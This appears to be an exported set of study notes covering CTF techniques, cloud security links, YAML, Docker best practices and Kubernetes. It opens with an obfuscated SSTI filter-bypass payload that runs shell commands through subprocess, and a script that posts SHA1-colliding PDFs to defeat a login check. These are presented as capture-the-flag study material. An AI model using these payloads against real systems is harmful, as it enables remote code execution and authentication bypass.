resources.name: SSTI - RCE Bypass Using subprocess
resources.description:
Problem:

  • os module is blocked.

  • . (dot) is restricted.

  • eval() is blocked.

Solution:

Use subprocess dynamically to execute system commands.

Payload:

getattr(__import__('subprocess'), 'check_output')(
    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]
).decode()

BreakdownS

  • __import__('subprocess') → Dynamically imports subprocess.

  • getattr(..., 'check_output') → Accesses check_output without using ..

  • [chr(99)+chr(97)+chr(116), ...] → Builds ['cat', '/flag.txt'] dynamically.

  • .decode() → Converts output from bytes to a readable string.

Usage:

  • Can be used in SSTI scenarios where os is blocked.

  • Works if subprocess is accessible.

  • Helps bypass filters that restrict . or direct function calls.
resources.description_html:

  • os module is blocked.

  • . (dot) is restricted.

  • eval() is blocked.

Solution:

Use subprocess dynamically to execute system commands.

Payload:

getattr(__import__('subprocess'), 'check_output')(
    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]
).decode()

BreakdownS

  • __import__('subprocess') → Dynamically imports subprocess.

  • getattr(..., 'check_output') → Accesses check_output without using ..

  • [chr(99)+chr(97)+chr(116), ...] → Builds ['cat', '/flag.txt'] dynamically.

  • .decode() → Converts output from bytes to a readable string.

Usage:

  • Can be used in SSTI scenarios where os is blocked.

  • Works if subprocess is accessible.

  • Helps bypass filters that restrict . or direct function calls.

resources.name: DTMF Decoder
resources.description:
Online DTMF Decoders


Upload the suspicious audio file to online DTMF detection tools:

  • DialABC (dialabc.com) analyzes audio recordings and presents statistics, graphs, and tables showing detected DTMF tones and their positions
  • The web-based decoder at dtmf.netlify.app allows adjusting sensitivity threshold for better detection
  • unframework's DTMF detection demo (unframework.github.io/dtmf-detect) can be used to analyze audio samples

Multi-Step Decoding

  • After extracting the DTMF tones (which typically result in a sequence of numbers), players often need to perform additional decoding steps:
  • Converting to ASCII/text
  • Decoding using T9/Multi-Tap phone keypad cipher
  • Converting from BigInteger to strings
  • Applying additional ciphers like ROT13 or hexadecimal conversion
resources.description_html:

  • Decoding using T9/Multi-Tap phone keypad cipher
  • Converting from BigInteger to strings
  • Applying additional ciphers like ROT13 or hexadecimal conversion

resources.name: SHA1 Collision
resources.description:
import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage {sys.argv[0]} <url>")
    exit(1)

url = sys.argv[1]
pdf1 = "https://shattered.io/static/shattered-1.pdf"
pdf2 = "https://shattered.io/static/shattered-2.pdf"

print("[*] Getting pdf1 content")
pdf1_bytes = requests.get(pdf1).content
print("[*] Getting pdf2 content")
pdf2_bytes = requests.get(pdf2).content

data = {
    "username": pdf2_bytes,
    "pwd": pdf1_bytes
}

res = requests.post(url, data=data)
print(res.text)
resources.description_html:
import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage {sys.argv[0]} <url>")
    exit(1)

url = sys.argv[1]
pdf1 = "https://shattered.io/static/shattered-1.pdf"
pdf2 = "https://shattered.io/static/shattered-2.pdf"

print("[*] Getting pdf1 content")
pdf1_bytes = requests.get(pdf1).content
print("[*] Getting pdf2 content")
pdf2_bytes = requests.get(pdf2).content

data = {
    "username": pdf2_bytes,
    "pwd": pdf1_bytes
}

res = requests.post(url, data=data)
print(res.text)

resources.name: Cloud Security Resources
resources.description:
Cloud Security Wiki


https://cloudsecwiki.com/

A comprehensive wiki aggregating cloud security resources, blogs, research articles, and tools for security researchers and developers, organized by cloud service provider. Community contributions are encouraged

 

Cloud Security Podcast TV

cloudsecuritypodcast.tv

An award-winning, vendor-neutral podcast network delivering entertaining and informative interviews, news, and practical insights on cloud security topics, including SOC, identity, runtime, and AI security. Suitable for all experience levels

 

CloudSecList

https://cloudseclist.com/

A weekly newsletter curated for cloud security professionals, summarizing the latest news, research, technical deep dives, tools, and major cloud provider updates, with a global readership and expert recommendations

 

Hacking the Cloud

https://hackingthe.cloud/

An open-source encyclopedia of offensive and defensive cloud security techniques, tactics, and tools, contributed by the community. Covers exploitation methods, detection evasion, and defensive strategies for various cloud platforms

learning_resources.title: Introduction to YAML
learning_resources.description:
Sure! Here's a well-formatted, meaningful summary of your video transcript on YAML. I’ve organized the content into clear sections and extracted all the key points for easy reference:

🔰 Introduction to YAML

  • Purpose: YAML is used to represent data, especially configuration data.

  • Why it's important: The rest of your course depends heavily on YAML, so it’s crucial to understand it—even if you're new to it.

  • Good to know: If you've worked with XML or JSON, YAML will feel familiar and easier to grasp.

🧱 YAML vs XML vs JSON

  • All three formats are used to structure data.

  • YAML is often simpler and more readable.

  • Example:

    • XML: Verbose with opening/closing tags.

    • JSON: Uses curly braces and key-value pairs.

    • YAML: Cleanest, uses indentation and colons.

🔑 YAML Basics

1. Key-Value Pairs

fruit: apple
vegetable: carrot
liquid: water
meat: chicken

  • Colon and space separate key and value.

  • No quotation marks needed for simple strings.

2. Arrays (Lists)

fruits:
  - apple
  - banana
  - grape

  • Use a dash - followed by a space for list items.

  • Indented under the list name (like fruits).

3. Dictionaries

banana:
  calories: 105
  fat: 0.4
  carbs: 27

  • Indentation represents hierarchy.

  • All properties of an item must have the same indentation.

  • Incorrect spacing can lead to YAML errors.

⚠️ Common YAML Error

banana:
  calories: 105
    fat: 0.4  # ❌ Incorrect indentation

  • If fat and carbs are more indented, they are interpreted as children of calories, which causes a syntax error.

🧩 Nested Structures

  • List of Dictionaries: Common for representing structured data like car details.

cars:
  - color: red
    model:
      name: Civic
      year: 2022
    transmission: automatic
    price: 22000
  - color: blue
    model:
      name: Corolla
      year: 2023
    transmission: manual
    price: 21000

When to Use:

  • Dictionary: For a single object with multiple properties.

  • List: For multiple values of the same type.

  • List of Dictionaries: For multiple objects, each with their own properties.

📌 Key Notes & Tips

  • Dictionaries are unordered collections. Order of keys doesn’t matter.

  • Lists are ordered collections. Order matters.

  • Comments start with # and are ignored by the parser.

# This is a comment

learning_resources.title: socket file (unix .sock file)
learning_resources.description:
Socket has multiple meanings in computing, but given your reference to cri-dockerd.sock, you're likely asking about Unix sockets.

A Unix socket (or IPC socket) is an inter-process communication mechanism that allows bidirectional data exchange between processes on the same machine. Unlike network sockets, Unix sockets operate entirely within the operating system's kernel and are represented as special files on the filesystem.

The .sock file extension you mentioned indicates a Unix socket file. Specifically:

  • cri-dockerd.sock is a socket file used by the Container Runtime Interface (CRI) implementation for Docker. This socket allows Kubernetes components to communicate with the Docker container runtime.

Unix sockets are commonly used in containerization and server applications because they:

  1. Provide faster communication than TCP/IP sockets since they don't require network protocol overhead
  2. Offer stronger security since they're only accessible on the local machine
  3. Support the same programming interface as network sockets

Other common socket files you might encounter include:

  • /var/run/docker.sock - Docker daemon's socket
  • /run/containerd/containerd.sock - Containerd's socket
  • /var/run/postgresql/.s.PGSQL.5432 - PostgreSQL database socket

learning_resources.title: Docker Best Practices: A Comprehensive Guide
learning_resources.description:
Docker Best Practices: A Comprehensive Guide

Let me walk you through Docker best practices in a structured, practical manner. I'll organize this by the container lifecycle and explain each aspect thoroughly.

1. Container Image Design

Base Image Selection

  • Practice: Use minimal, official images appropriate for your application.

  • Practical Example: 

    # Bad practice
FROM ubuntu:latest
RUN apt-get update && apt-get install -y python3

# Good practice
FROM python:3.11-slim

  • Explanation: The slim Python image includes only necessary components, reducing attack surface and image size. Using specific versions (3.11-slim vs latest) ensures reproducibility.

Layer Management

  • Practice: Minimize layers by combining related commands.

  • Practical Example:

    # Bad practice
RUN apt-get update
RUN apt-get install -y package1
RUN apt-get install -y package2

# Good practice
RUN apt-get update && \
    apt-get install -y \
        package1 \
        package2 \
    && apt-get clean \
    && rm -rf /var/lib/apt/lists/*

  • Explanation: This reduces image size and improves build efficiency. The cleanup commands remove package caches, further reducing the image size.

Multi-stage Builds

  • Practice: Use multi-stage builds to separate build and runtime environments.

  • Practical Example:

    # Build stage
FROM golang:1.21 AS builder
WORKDIR /app
COPY . .
RUN go build -o myapp

# Runtime stage
FROM alpine:3.18
COPY --from=builder /app/myapp /usr/local/bin/
ENTRYPOINT ["myapp"]

  • Explanation: The final image contains only the compiled binary without build tools or source code, reducing size and potential vulnerabilities.

Proper Instruction Ordering

  • Practice: Order Dockerfile instructions from least to most frequently changing.

  • Practical Example:

    FROM node:18-alpine

# Rarely changes
RUN apk add --no-cache tini

# Changes when dependencies change
WORKDIR /app
COPY package*.json ./
RUN npm ci

# Changes frequently during development
COPY . .

ENTRYPOINT ["/sbin/tini", "--"]
CMD ["node", "index.js"]

  • Explanation: This maximizes Docker's layer caching, making rebuilds faster as only layers affected by changes are rebuilt.

2. Security Architecture

Non-root User Operation

  • Practice: Create and use non-root users for running applications.

  • Practical Example:

    FROM node:18-alpine

# Create app user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app
COPY --chown=appuser:appgroup . .

USER appuser
CMD ["node", "index.js"]

  • Explanation: This limits the damage potential if the container is compromised, as the process lacks root privileges.

Sensitive Data Management

  • Practice: Use build-time secrets and runtime configuration appropriately.

  • Practical Example:

    # Build-time secrets (Docker BuildKit)
# RUN --mount=type=secret,id=npm_token npm config set //registry.npmjs.org/:_authToken=$(cat /run/secrets/npm_token)

# Runtime configuration
CMD ["node", "index.js"]

  • Explanation: For secrets used only during build, use Docker BuildKit's secret mounting. For runtime, inject secrets via orchestration platforms (Docker Swarm secrets, Kubernetes secrets) rather than environment variables.

Security Scanning

  • Practice: Integrate vulnerability scanning in CI/CD pipeline.

  • Practical Example:

    # In CI/CD pipeline (e.g., GitHub Actions)
steps:
  - name: Build image
    run: docker build -t myapp:${{ github.sha }} .
    
  - name: Scan image
    uses: aquasecurity/trivy-action@master
    with:
      image-ref: myapp:${{ github.sha }}
      format: 'table'
      exit-code: '1'
      severity: 'CRITICAL,HIGH'

  • Explanation: Automated scanning catches vulnerabilities before deployment. Setting exit codes based on severity ensures critical issues block the pipeline.

3. Configuration Management

Environment Variables

  • Practice: Use environment variables for runtime configuration.

  • Practical Example:

    FROM node:18-alpine

# Document environment variables
ENV NODE_ENV=production \
    SERVER_PORT=3000 \
    LOG_LEVEL=info

WORKDIR /app
COPY . .

EXPOSE ${SERVER_PORT}
CMD ["node", "index.js"]

  • Explanation: Setting defaults in the Dockerfile documents expected variables while allowing override at runtime without image rebuilds.

Health Checks

  • Practice: Implement container health checks.

  • Practical Example:

    FROM nginx:1.25-alpine

COPY ./config/nginx.conf /etc/nginx/conf.d/default.conf
COPY ./html /usr/share/nginx/html

HEALTHCHECK --interval=30s --timeout=3s \
  CMD curl -f http://localhost/ || exit 1

  • Explanation: Orchestrators use health checks to determine container status and trigger restarts when necessary, improving reliability.

Resource Constraints

  • Practice: Set appropriate resource limits.

  • Practical Example:

    # In docker-compose.yml
services:
  app:
    image: myapp:latest
    deploy:
      resources:
        limits:
          cpus: '0.5'
          memory: 512M
        reservations:
          cpus: '0.1'
          memory: 128M

  • Explanation: Prevents containers from starving other services of resources, improving overall system stability.

4. Storage and State Management

Volume Management

  • Practice: Use named volumes for persistent data.

  • Practical Example:

    # In docker-compose.yml
services:
  postgres:
    image: postgres:15-alpine
    volumes:
      - postgres_data:/var/lib/postgresql/data
    environment:
      POSTGRES_PASSWORD_FILE: /run/secrets/postgres_password
    secrets:
      - postgres_password

volumes:
  postgres_data:
    driver: local

secrets:
  postgres_password:
    file: ./secrets/postgres_password.txt

  • Explanation: Named volumes persist data beyond container lifecycle and can be backed up independently.

Ephemeral Design

  • Practice: Design stateless containers where possible.

  • Practical Example:

    FROM node:18-alpine

WORKDIR /app
COPY . .

# Store runtime data in designated volume
VOLUME /app/data

# Use tmpfs for temporary files
CMD ["node", "--tmpdir=/dev/shm", "index.js"]

  • Explanation: Separating ephemeral data (logs, temporary files) from persistent state improves container replacability.

5. Networking

Network Segmentation

  • Practice: Create dedicated networks for service isolation.

  • Practical Example:

    # In docker-compose.yml
networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true

services:
  webapp:
    networks:
      - frontend
  api:
    networks:
      - frontend
      - backend
  database:
    networks:
      - backend

  • Explanation: Network segmentation improves security by restricting communication paths. The database is only accessible to the API, not directly from the webapp.

Port Exposure

  • Practice: Only expose necessary ports.

  • Practical Example:

    FROM node:18-alpine

WORKDIR /app
COPY . .

# Document the port that will be exposed
EXPOSE 3000

CMD ["node", "index.js"]

    # In docker-compose.yml
services:
  webapp:
    image: webapp:latest
    ports:
      - "8080:3000"

  • Explanation: Limiting exposed ports reduces attack surface. The EXPOSE instruction documents which ports the application uses, while actual port mapping happens in deployment configuration.

6. Orchestration and Deployment

Container Initialization

  • Practice: Implement proper startup and shutdown handling.

  • Practical Example:

    FROM node:18-alpine

# Add tini as init process
RUN apk add --no-cache tini

WORKDIR /app
COPY . .

ENTRYPOINT ["/sbin/tini", "--"]
CMD ["node", "index.js"]

  • Explanation: Using a proper init system like tini ensures proper signal handling and zombie process cleanup.

Dependency Management

  • Practice: Handle service dependencies explicitly.

  • Practical Example:

    # In docker-compose.yml
services:
  webapp:
    image: webapp:latest
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy
    restart: unless-stopped

  db:
    image: postgres:15-alpine
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 5s
      retries: 5

  • Explanation: The depends_on with health checks ensures containers start in proper order and wait until dependencies are truly ready.

7. Documentation and Maintenance

Documentation Practices

  • Practice: Document all configurations and assumptions.

  • Practical Example:

    FROM python:3.11-slim

# Application metadata
LABEL maintainer="team@example.com" \
      version="1.0.0" \
      description="Example API service"

# Set environment variables with documentation
# SERVER_PORT: The port on which the service listens (default: 8000)
# LOG_LEVEL: Logging level (default: info, options: debug, info, warning, error)
# DB_HOST: Database hostname (required)
ENV SERVER_PORT=8000 \
    LOG_LEVEL=info

# Define volumes with comments
# /app/data: Contains persisted application data
VOLUME /app/data

WORKDIR /app
COPY . .

# Document exposed ports
EXPOSE ${SERVER_PORT}

CMD ["python", "app.py"]

  • Explanation: Comprehensive documentation helps new team members understand how the container works and what configurations are available.

Versioning Strategy

  • Practice: Version images semantically.

  • Practical Example:

    # Build with semantic version tag
docker build -t myapp:1.2.3 .

# Tag also with short commit hash for traceability
docker tag myapp:1.2.3 myapp:1.2.3-$(git rev-parse --short HEAD)

# Alias as latest for convenience
docker tag myapp:1.2.3 myapp:latest

  • Explanation: Semantic versioning makes it clear which versions have breaking changes, new features, or just fixes. Including commit hashes improves traceability.

8. Monitoring and Observability

Logging Best Practices

  • Practice: Output logs to stdout/stderr following the 12-factor app principles.

  • Practical Example:

    FROM node:18-alpine

WORKDIR /app
COPY . .

# Configure application to log to stdout/stderr
ENV LOG_OUTPUT=stdout

CMD ["node", "index.js"]

  • Explanation: Logging to stdout/stderr lets Docker's logging drivers handle log collection, making logs accessible via docker logs and integrations with logging systems.

Metrics Exposure

  • Practice: Expose application metrics for monitoring.

  • Practical Example:

    FROM python:3.11-slim

WORKDIR /app
COPY . .

# Install requirements
RUN pip install -r requirements.txt

# Expose metrics endpoint
ENV METRICS_PORT=9090
EXPOSE 8000 ${METRICS_PORT}

CMD ["python", "app.py"]

  • Explanation: Exposing metrics on a separate port allows monitoring systems like Prometheus to scrape them without affecting the main application.

Summary

This comprehensive approach addresses the full container lifecycle with concrete examples and explanations. By implementing these practices, you'll create a Docker environment that is:

  1. Secure by design

  2. Efficiently built and deployed

  3. Properly configured for production use

  4. Well-documented for team collaboration

  5. Maintainable over time

  6. Observable for operational monitoring

These best practices should be adapted to your specific environment and requirements, but they provide a solid foundation for Docker architecture.

learning_resources.title: Docker's Resource Sharing at the OS and Kernel Level
Replication Controller & Replicaset
learning_resources.description:
The spec section defines what's inside the object we're creating.

The replica set is in fact a process that monitor the pods.

Even if you have a single pod, the replication controller can help by automatically bringing up a new pod when the existing one fails. Thus, the replication controller ensures that the specified number of pods are running at all times, even if it's just one or 100.

However, remember that using the file name as input will not result in the number of replicas being updated automatically in the file. In other words, the number of replicas in the replica set definition file will still be three, even though you scaled your replica set to have six replicas using the cube control scale command and the file as input.

kubectl create -f replicaset-definition.yaml
kubectl get replicaset
kubectl delete replicaset myapp-replicaset
kubectl replace -f replicaset-definition.yaml
kubectl scale --replicas=6 -f replicaset-definition.yaml

 

The replica set is terminating the new pod that we just created. Why??

It's not allowing more pods with the same labels than the number of replicas configured on the replicaset. so If I've defined 3 replicas and all are running and I manually create one pod than it will be terminated.

kubectl scale replicaset myapp-replicaset --replicas=2

For Replicaset

apiVersion: v1 (Gives an error)

apiVersion: apps/v1

 

Label Matching

 

two sets of labels matter:

  1. The labels inside the Pod template

  2. The selector in the ReplicaSet

They must match. The label at the very top of the ReplicaSet (under metadata.labels) is optional and doesn’t affect matching — it’s just metadata for the ReplicaSet itself.

 

What if they don’t match?

apiVersion: apps/v1
kind: ReplicaSet
metadata:
  name: my-replicaset
spec:
  replicas: 3
  selector:
    matchLabels:
      app: myapp
  template:
    metadata:
      labels:
        app: somethingelse  # ❌ This does NOT match the selector
    spec:
      containers:
      - name: nginx
        image: nginx

Here:

  • Selector is still app: myapp

  • Pod label is now app: somethingelse

The ReplicaSet won’t find any Pods that match its selector, so it will keep trying to create new Pods.
But those new Pods will still not match — it’s a loop. It never manages them correctly.

learning_resources.title: Deployments
learning_resources.description:
A Kubernetes Deployment is a higher-level abstraction used to manage application updates and scaling in a controlled, automated, and reliable way. It sits above ReplicaSets and Pods in the Kubernetes hierarchy, allowing you to define what your desired application state should look like—such as how many replicas (copies) of a Pod you want running and which container image to use. When you apply a Deployment, Kubernetes ensures that the correct number of Pods are running and kept up to date. If any Pods fail, the Deployment controller replaces them automatically, maintaining the declared state without manual intervention.

What makes Deployments particularly powerful is their support for rolling updates and rollbacks. Instead of updating all Pods at once—which could cause downtime—Deployments replace Pods gradually, minimizing service interruption. If something goes wrong during an update, you can easily roll back to a previous version. Additionally, you can pause a deployment to make multiple changes and then resume it to apply all changes together. This level of control, combined with automation and reliability, makes Deployments the standard and preferred way to manage application lifecycles in Kubernetes.

 

Deployment
   ⬇️
Creates ➡️ ReplicaSet
                            ⬇️
                           Creates ➡️ Pods (containers)

 

Updates & Rollbacks

 

kubectl rollout status deployment/m-appdeployment

kubectl rollout history deployment/m-appdeployment

 

A new rollout is triggered and a new revision of the deployment is created.

kubectl set image deployment/myapp-deployment \ nginx-container=nginx:1.9.1
